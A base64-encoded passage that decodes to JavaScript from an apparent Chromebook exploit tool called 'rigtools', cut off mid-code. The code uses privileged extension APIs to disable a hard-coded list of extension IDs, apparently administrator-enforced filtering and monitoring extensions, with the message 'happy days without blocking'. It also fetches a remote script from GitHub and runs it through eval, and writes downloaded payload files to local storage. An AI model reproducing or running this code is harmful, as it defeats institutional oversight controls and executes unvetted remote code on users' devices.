OwogICAgZG9jdW1lbnQuY2xvc2UoKTsKCiAgICBpZiAoY2hyb21lLmZpbGVNYW5hZ2VyUHJpdmF0ZSkgewogICAgICAgIGNocm9tZS5maWxlTWFuYWdlclByaXZhdGUub3BlblVSTCgiZGF0YTp0ZXh0L2h0bWwsPGgxPkhlbGxvPC9oMT4iKTsKICAgICAgICBkb2N1bWVudC53cml0ZShmaWxlTWFuYWdlclByaXZhdGVUZW1wbGF0ZSk7CiAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjYnRuX0ZNUF9vcGVuVVJMIikub25jbGljayA9IGZ1bmN0aW9uKGV2KSB7fTsKICAgIH0KCiAgICBpZiAoY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZCkgewogICAgICAgIGRvY3VtZW50LmJvZHkuaW5zZXJ0QWRqYWNlbnRIVE1MKCJiZWZvcmVlbmQiLCBtYW5hZ2VtZW50VGVtcGxhdGUpOwogICAgICAgIGNvbnN0IGV4dGxpc3RfZWxlbWVudCA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5leHRsaXN0Iik7CgogICAgICAgIGF3YWl0IHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpOwogICAgICAgIGNvbnN0IGNvbnRhaW5lcl9leHRlbnNpb25zID0gZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKAogICAgICAgICAgICAiI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0IgogICAgICAgICk7CgogICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiNjdXJyZW50LWV4dGVuc2lvbiIpLm9uY2xpY2sgPQogICAgICAgICAgICBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IGdyYWJpZHRva2lsbCA9IGNocm9tZS5ydW50aW1lLmlkOwogICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LnNldEVuYWJsZWQoZ3JhYmlkdG9raWxsLCBmYWxzZSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBhbGVydCgidW5zdWNjZXNzZnVsIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH07CgogICAgICAgIGNvbnRhaW5lcl9leHRlbnNpb25zLnF1ZXJ5U2VsZWN0b3IoIiNybXYtY21uLWJsdCIpLm9uY2xpY2sgPSBmdW5jdGlvbiBkZigpIHsKICAgICAgICAgICAgY29uc3QgYmxvYXRJZHMgPSBbCiAgICAgICAgICAgICAgICAiY2diYmJqbWdkcG5pZmlqY29uaGFtZ2dqZWhsYW1jaWYiLAogICAgICAgICAgICAgICAgImxma2JibWNsbnBhaWhwYWFqaG9oaGZkamVsY2hraWtmIiwKICAgICAgICAgICAgICAgICJuY2JvZm5obW1mZmZtY2RtYmpmYWlnZXBrZ21qbmxuZSIsCiAgICAgICAgICAgICAgICAicG9obWdvYmRlYWplbWNpZnBvbGRubmhmZmpubmtoZ2YiLAogICAgICAgICAgICAgICAgImJlY2RwbGZhbG9vZmxhbmlwam9ibGNtcGFla2tiYmhlIiwKICAgICAgICAgICAgICAgICJmZWVwbWRsbWhwbGFvamFiZW9lY2FvYmZtaWJvb2FpZCIsCiAgICAgICAgICAgICAgICAiYWRrY3BrcGdoYWhtYm9wa2pjaG9iaWVja2VvYW9lZW0iLAogICAgICAgICAgICAgICAgImhhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oIiwKICAgICAgICAgICAgICAgICJmaWxncGprZG1qaW5tamJlcGJwbW5mb2Jtam1naW1vbiIsCiAgICAgICAgICAgICAgICAia2tibWRnamdnY2RhamNrZGxibmdkam9ucGNocGFpZWEiLAogICAgICAgICAgICAgICAgIm5qZG5pY2xnZWdpamRjZGxpa2xnaWVpY2FucG1jbmdqIiwKICAgICAgICAgICAgICAgICJocGtkb2tha2pnbHBwZWVrZmVla21lYmZhaGFkbmZscCIsCiAgICAgICAgICAgIF07CgogICAgICAgICAgICBsZXQgZXh0cyA9IHt9OwogICAgICAgICAgICBsZXQgZXh0bG5ndGggPSAwOwoKICAgICAgICAgICAgZnVuY3Rpb24gZ2V0TGVuZ3RoKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgYmxvYXRJZHMuZm9yRWFjaCgoaWQsIGkpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uRXhpc3RzKGlkKS50aGVuKChyZXMpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChyZXMpIGV4dGxuZ3RoKys7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoYmxvYXRJZHMubGVuZ3RoIC0gMSA9PT0gaSkgcmVzb2x2ZSgpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBpbml0RXh0T2JqKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgYmxvYXRJZHMuZm9yRWFjaCgoaWQpID0+CiAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5hc3NpZ24oZXh0cywgSlNPTi5wYXJzZShgeyIke2UuaWR9IjoiJHtlLnNob3J0TmFtZX0ifWApKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChPYmplY3Qua2V5cyhleHRzKS5sZW5ndGggPT0gZXh0bG5ndGgpIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGdldExlbmd0aCgpLnRoZW4oKCkgPT4KICAgICAgICAgICAgICAgIGluaXRFeHRPYmooKS50aGVuKCgpID0+CiAgICAgICAgICAgICAgICAgICAgbWFrZURpYWxvZygKICAgICAgICAgICAgICAgICAgICAgICAgIkFyZSB5b3Ugc3VyZSB5b3Ugd2FudCB0byBkaXNhYmxlIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9ucz8iLAogICAgICAgICAgICAgICAgICAgICAgICBPYmplY3QudmFsdWVzKGV4dHMpLAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHt9LAogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBkaXNhYmxlZEV4dHMgPSBbXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC5rZXlzKGV4dHMpLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuZ2V0KGlkLCAoZSkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoZS5lbmFibGVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMucHVzaChlLnNob3J0TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKGlkLCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghZGlzYWJsZWRFeHRzLmxlbmd0aCA8IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImRpc2FibGVkIHRoZSBmb2xsb3dpbmcgZXh0ZW5zaW9uczpcclxuIiArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlZEV4dHMuam9pbigiXHJcbiIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmxlbmd0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVFeHRlbnNpb25TdGF0dXMoZXh0bGlzdF9lbGVtZW50KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAyNTApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICApOwogICAgICAgIH07CgogICAgICAgIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpID09IEpTT04uc3RyaW5naWZ5KFtdKSkgewogICAgICAgICAgICBjb250YWluZXJfZXh0ZW5zaW9ucwogICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBub25lOyIpOwogICAgICAgIH0KCiAgICAgICAgY29udGFpbmVyX2V4dGVuc2lvbnMucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikub25jbGljayA9CiAgICAgICAgICAgIGZ1bmN0aW9uIGRmKGUpIHsKICAgICAgICAgICAgICAgIGxldCBleHRzID0ge307CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gaW5pdEV4dE9iaigpIHsKICAgICAgICAgICAgICAgICAgICBsZXQgaWRsaXN0ID0gSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWRsaXN0LmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXQoaWQsIChlKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0LmFzc2lnbihleHRzLCBKU09OLnBhcnNlKGB7IiR7ZS5pZH0iOiIke2Uuc2hvcnROYW1lfSJ9YCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChPYmplY3Qua2V5cyhleHRzKS5sZW5ndGggPT0gaWRsaXN0Lmxlbmd0aCkgcmVzb2x2ZSgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGluaXRFeHRPYmooKS50aGVuKCgpID0+IHsKICAgICAgICAgICAgICAgICAgICBtYWtlRGlhbG9nKAogICAgICAgICAgICAgICAgICAgICAgICAiQXJlIHlvdSBzdXJlIHlvdSB3YW50IHRvIGRpc2FibGUgdGhlIGZvbGxvd2luZyBleHRlbnNpb25zPyIsCiAgICAgICAgICAgICAgICAgICAgICAgIE9iamVjdC52YWx1ZXMoZXh0cyksCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkge30sCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRpc2FibGVkRXh0cyA9IFtdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidXNlcmRlZklkcyIpKS5mb3JFYWNoKChpZCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldChpZCwgKGUpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGUuZW5hYmxlZCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlkID09IGNocm9tZS5ydW50aW1lLmlkKSByZXR1cm47CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLnB1c2goZS5zaG9ydE5hbWUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChpZCwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWRpc2FibGVkRXh0cy5sZW5ndGggPCAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1ha2VUb2FzdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJkaXNhYmxlZCB0aGUgZm9sbG93aW5nIGV4dGVuc2lvbnM6XHJcbiIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzYWJsZWRFeHRzLmpvaW4oIlxyXG4iKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc2FibGVkRXh0cy5sZW5ndGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlRXh0ZW5zaW9uU3RhdHVzKGV4dGxpc3RfZWxlbWVudCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMjUwKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IG90aGVyRmVhdHVyZXMgPSB3aW5kb3cuY2hyb21lLnJ1bnRpbWUuZ2V0TWFuaWZlc3QoKTsKICAgIGNvbnN0IHBlcm1pc3Npb25zID0gb3RoZXJGZWF0dXJlcy5wZXJtaXNzaW9uczsKCiAgICBuZXcgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcygpLmFjdGl2YXRlKCk7CiAgICBkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgKICAgICAgICAiYmVmb3JlZW5kIiwKICAgICAgICBgCiAgICAgIDx0aXRsZT5VbnRpdGxlZCBEb2N1bWVudDwvdGl0bGU+CiAgICAgIDxkaXYgY2xhc3M9ImJhY2tncm91bmQtZ3JpZCI+PC9kaXY+CiAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9kb2NzLmljbyI+CiAgICAgIGAKICAgICk7CgogICAgY29uc3QgU2NyaXB0QnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIiNvdGhlci1idXR0b25zIik7CgogICAgU2NyaXB0QnV0dG9ucy5xdWVyeVNlbGVjdG9yKCIjc3dhbXAiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIGZldGNoKAogICAgICAgICAgICAgICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9UM00xTjRML3JpZ3Rvb2xzLXVwZGF0ZWQtdWkvcmVmcy9oZWFkcy9tYWluL3NjcmlwdHMvc3dhbXAtdWx0cmEuanMiCiAgICAgICAgICAgICkKICAgICAgICAgICAgLnRoZW4oKHJlcykgPT4gcmVzLnRleHQoKSkKICAgICAgICAgICAgLnRoZW4oZXZhbCk7CiAgICB9OwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3VwZGF0ZSIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgKGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgZnMgPSBhd2FpdCBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlKSB7CiAgICAgICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWF0ZTogdHJ1ZQogICAgICAgICAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LnJlbW92ZShmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZzLnJvb3QuZ2V0RmlsZShmaWxlLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCBmdW5jdGlvbihlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbih3cml0ZXIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9IHJlc29sdmUuYmluZChudWxsLCBlbnRyeS50b1VSTCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCB3cml0ZUZpbGUoCiAgICAgICAgICAgICAgICAicmlndG9vbHMuaHRtbCIsCiAgICAgICAgICAgICAgICBgJHthd2FpdCBmZXRjaCgKICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9wYXlsb2Fkcy9pbmRleC5odG1sIgogICAgICAgICkudGhlbigocmVzKSA9PiByZXMudGV4dCgpKX08c2NyaXB0IHNyYz0iLi9yaWd0b29scy5qcyI+PC9zY3JpcHQ+YAogICAgICAgICAgICApOwoKICAgICAgICAgICAgYXdhaXQgd3JpdGVGaWxlKAogICAgICAgICAgICAgICAgInJpZ3Rvb2xzLmpzIiwKICAgICAgICAgICAgICAgIGF3YWl0IGZldGNoKAogICAgICAgICAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9yaWd0b29scy11cGRhdGVkLXVpL3JlZnMvaGVhZHMvbWFpbi9wYXlsb2Fkcy9pbmRleC5qcyIKICAgICAgICAgICAgICAgICkudGhlbigocmVzKSA9PiByZXMudGV4dCgpKQogICAgICAgICAgICApOwoKICAgICAgICAgICAgY2hyb21lLnRhYnMuY3JlYXRlKHsKICAgICAgICAgICAgICAgIHVybAogICAgICAgICAgICB9KTsKICAgICAgICB9KSgpOwogICAgfTsKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI3F1aWNrLXJtdi1ibHQiKS5vbmNsaWNrID0gYXN5bmMgZnVuY3Rpb24gZGYoZSkgewogICAgICAgIChhc3luYyAoKSA9PiB7CgogICAgICAgICAgICBjb25zdCBmcyA9IGF3YWl0IG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlKSB7CiAgICAgICAgICAgICAgICAgIHdlYmtpdFJlcXVlc3RGaWxlU3lzdGVtKFBFUlNJU1RFTlQsIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGZ1bmN0aW9uIHdyaXRlRmlsZShmaWxlLCBkYXRhKSB7CiAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgZW50cnkucmVtb3ZlKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgY29uc3QgSlMgPSBgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBibG9hdElkcyA9IFsKICAgICAgICAgICAgICAgICAgICAgICJjZ2JiYmptZ2RwbmlmaWpjb25oYW1nZ2plaGxhbWNpZiIsCiAgICAgICAgICAgICAgICAgICAgICAibGZrYmJtY2xucGFpaHBhYWpob2hoZmRqZWxjaGtpa2YiLAogICAgICAgICAgICAgICAgICAgICAgIm5jYm9mbmhtbWZmZm1jZG1iamZhaWdlcGtnbWpubG5lIiwKICAgICAgICAgICAgICAgICAgICAgICJwb2htZ29iZGVhamVtY2lmcG9sZG5uaGZmam5ua2hnZiIsCiAgICAgICAgICAgICAgICAgICAgICAiYmVjZHBsZmFsb29mbGFuaXBqb2JsY21wYWVra2JiaGUiLAogICAgICAgICAgICAgICAgICAgICAgImZlZXBtZGxtaHBsYW9qYWJlb2VjYW9iZm1pYm9vYWlkIiwKICAgICAgICAgICAgICAgICAgICAgICJhZGtjcGtwZ2hhaG1ib3BramNob2JpZWNrZW9hb2VlbSIsCiAgICAgICAgICAgICAgICAgICAgICAiaGFsZGxnbGRwbGduZ2dramFhZmhlbGdpYWdsYWZhbmgiLAogICAgICAgICAgICAgICAgICAgICAgImZpbGdwamtkbWppbm1qYmVwYnBtbmZvYm1qbWdpbW9uIiwKICAgICAgICAgICAgICAgICAgICAgICJra2JtZGdqZ2djZGFqY2tkbGJuZ2Rqb25wY2hwYWllYSIsCiAgICAgICAgICAgICAgICAgICAgICAibmpkbmljbGdlZ2lqZGNkbGlrbGdpZWljYW5wbWNuZ2oiLAogICAgICAgICAgICAgICAgICAgICAgImhwa2Rva2FramdscHBlZWtmZWVrbWViZmFoYWRuZmxwIgogICAgICAgICAgICAgICAgICAgIF07CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGJsb2F0SWRzLmZvckVhY2goKGlkKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICBpZiAoaWQgPT0gY2hyb21lLnJ1bnRpbWUuaWQpIHJldHVybjsKICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChpZCwgZmFsc2UpOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jbG9zZSgpOwogICAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBhbGVydCgidW5zdWNjZXNzZnVsIik7CiAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgYDsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IGZpbGVOYW1lID0gImJsb2F0IjsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNvbnN0IHVybCA9IGF3YWl0IHdyaXRlRmlsZShgJHtmaWxlTmFtZX0uaHRtbGAsYDwhZG9jdHlwZWh0bWw+PHRpdGxlPmRpc2FibGluZy4uPC90aXRsZT48bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PUludGVyOml0YWwsb3Bzeix3Z2h0QDAsMTQuLjMyLDEwMC4uOTAwOzEsMTQuLjMyLDEwMC4uOTAwJmRpc3BsYXk9c3dhcCJyZWw9c3R5bGVzaGVldD48c3R5bGU+cHttYXJnaW46MH1ib2R5e2JhY2tncm91bmQtY29sb3I6IzAwMDtjb2xvcjojZmZmO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWY7bWFyZ2luOjA7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpjZW50ZXI7YWxpZ24taXRlbXM6Y2VudGVyO2hlaWdodDoxMDB2aH1oMTo6YmVmb3Jle2NvbnRlbnQ6IiMgIjtjb2xvcjpva2xjaCg4MS4yMSUgLjE0MDkgMTY1LjE0KTtmb250LXdlaWdodDo5MDB9LmlubmVye2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpjZW50ZXI7dGV4dC1hbGlnbjpjZW50ZXJ9dGV4dGFyZWF7d2lkdGg6bWF4LWNvbnRlbnQ7cGFkZGluZy10b3A6MWVtO292ZXJmbG93LXk6aGlkZGVuO2JvcmRlci1yYWRpdXM6MTBweDtiYWNrZ3JvdW5kOm9rbGNoKDE3LjAzJSAuMDA4MyAyODUuNDkgLyAuNSk7Ym9yZGVyOjFweCBzb2xpZCBva2xjaCg2OC42NSUgLjAzNzQgMjc0LjczIC8gLjUpO2NvbG9yOm9rbGNoKDk1LjkyJSAuMDE5MjUzIDI3My4yMzc3KTtyZXNpemU6bm9uZTtmb250LWZhbWlseTptb25vc3BhY2U7dHJhbnNpdGlvbjphbGwgLjVzIGN1YmljLWJlemllciguMTc1LC44ODUsLjMyLDEuOSksY29sb3IgLjI1cyxib3JkZXItY29sb3IgLjI1c308L3N0eWxlPjxkaXYgY2xhc3M9aW5uZXI+PHRleHRhcmVhIGNvbHM9MTIgcmVhZG9ubHkgcm93cz0yPiAgKF5fX19fXik8L3RleHRhcmVhPjxoMT5kaXNhYmxpbmcuLi48L2gxPjxwPmhhcHB5IGRheXMgIHdpdGhvdXQgYmxvY2tpbmcgYW0gaSByaWdodD88L2Rpdj48c2NyaXB0IHNyYz0uLyR7ZmlsZU5hbWV9LmpzPjwvc2NyaXB0PmApOwogICAgICAgICAgICAKICAgICAgICAgICAgYXdhaXQgd3JpdGVGaWxlKGAke2ZpbGVOYW1lfS5qc2AsIEpTKTsKICAgICAgICAgICAgCiAgICAgICAgICAgIGNocm9tZS50YWJzLmNyZWF0ZSh7IHVybCB9KTsKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pKCk7CiAgICB9OwoKICAgIFNjcmlwdEJ1dHRvbnMucXVlcnlTZWxlY3RvcigiI2hzdGZsZCIpLm9uY2xpY2sgPSBhc3luYyBmdW5jdGlvbiBkZihlKSB7CiAgICAgICAgZG9jdW1lbnQudGl0bGUgPSAiVW50aXRsZWQgRG9jdW1lbnQiOwogICAgICAgIGxldCBsaW5rID0KICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcigibGlua1tyZWx+PSdpY29u